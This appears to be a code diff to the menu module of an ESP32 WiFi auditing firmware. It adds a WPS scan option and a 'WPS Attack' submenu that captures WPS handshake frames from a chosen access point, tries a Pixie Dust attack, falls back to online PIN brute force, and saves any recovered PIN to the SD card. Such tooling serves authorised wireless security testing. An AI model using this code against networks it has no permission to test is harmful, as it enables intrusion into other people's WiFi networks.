@@ -1,6 +1,8 @@
 #include "MenuFunctions.h"
 #include "lang_var.h"
+#include <vector>
 //#include "icons.h"
+extern std::vector<WPS_AP> wps_aps;
 #include "configs.h"
 #include "TouchDrvGT911.hpp"
 
@@ -1689,6 +1691,7 @@ void MenuFunctions::RunSetup()
   // WiFi menu stuff
   wifiSnifferMenu.list = new LinkedList<MenuNode>();
   wifiAttackMenu.list = new LinkedList<MenuNode>();
+  wpsMenu.list = new LinkedList<MenuNode>();
   #ifdef HAS_GPS
     wardrivingMenu.list = new LinkedList<MenuNode>();
   #endif
@@ -1748,6 +1751,7 @@ void MenuFunctions::RunSetup()
   bluetoothMenu.name = text_table1[19];
   wifiSnifferMenu.name = text_table1[20];
   wifiAttackMenu.name = text_table1[21];
+  wpsMenu.name = "WPS Attack";
   wifiGeneralMenu.name = text_table1[22];
   saveFileMenu.name = "Save/Load Files";
   saveSSIDsMenu.name = "Save SSIDs";
@@ -1914,6 +1918,11 @@ void MenuFunctions::RunSetup()
     this->drawStatusBar();
     wifi_scan_obj.StartScan(WIFI_SCAN_SIG_STREN, TFT_CYAN);
   });
+  this->addNodes(&wifiSnifferMenu, "WPS Scan", TFTGREEN, NULL, BEACON_SNIFF, [this]() {
+    display_obj.clearScreen();
+    this->drawStatusBar();
+    wifi_scan_obj.StartScan(WIFI_SCAN_WPS, TFT_GREEN);
+  });
   
   // Build Wardriving menu
   #ifdef HAS_GPS
@@ -1983,6 +1992,34 @@ void MenuFunctions::RunSetup()
     display_obj.clearScreen();
     this->drawStatusBar();
     wifi_scan_obj.StartScan(WIFI_ATTACK_DEAUTH_TARGETED, TFT_ORANGE);
+  });
+
+  this->addNodes(&wifiAttackMenu, "WPS Attack", TFTRED, NULL, ATTACKS, [this]() {
+    wpsMenu.list->clear();
+    this->addNodes(&wpsMenu, text09, TFTLIGHTGREY, NULL, 0, [this]() {
+      this->changeMenu(wpsMenu.parentMenu);
+    });
+    for (int i = 0; i < wps_aps.size(); i++) {
+      this->addNodes(&wpsMenu, wps_aps[i].ssid, TFTCYAN, NULL, 255, [this, i](){
+        display_obj.clearScreen();
+        display_obj.tft.println("Capturing WPS frames for " + wps_aps[i].ssid + "...");
+        wifi_scan_obj.StartScan(WIFI_SCAN_WPS_CAPTURE, TFT_RED);
+        delay(15000);
+        wifi_scan_obj.StopScan(WIFI_SCAN_WPS_CAPTURE);
+        display_obj.tft.println("Finished capturing. Attacking...");
+        String pin;
+        if (wifi_scan_obj.wps_attack.has_m1 && wifi_scan_obj.wps_attack.has_m2 && wifi_scan_obj.wps_attack.has_m3 && wps_cracker.pixieDustAttack(wifi_scan_obj.wps_attack.m1, wifi_scan_obj.wps_attack.m2, wifi_scan_obj.wps_attack.m3, pin, wps_aps[i].manufacturer)) {
+          display_obj.tft.println("Pixie Dust OK! PIN: " + pin);
+          sd_obj.savePIN(wps_aps[i].ssid, pin, wps_aps[i].bssid);
+        } else if (wps_cracker.onlineBruteWPS(wps_aps[i].bssid, pin)) {
+          display_obj.tft.println("Brute force OK! PIN: " + pin);
+          sd_obj.savePIN(wps_aps[i].ssid, pin, wps_aps[i].bssid);
+        } else {
+          display_obj.tft.println("Attack failed. WPS may be locked.");
+        }
+      });
+    }
+    this->changeMenu(&wpsMenu);
   });
 
   // Build WiFi General menu
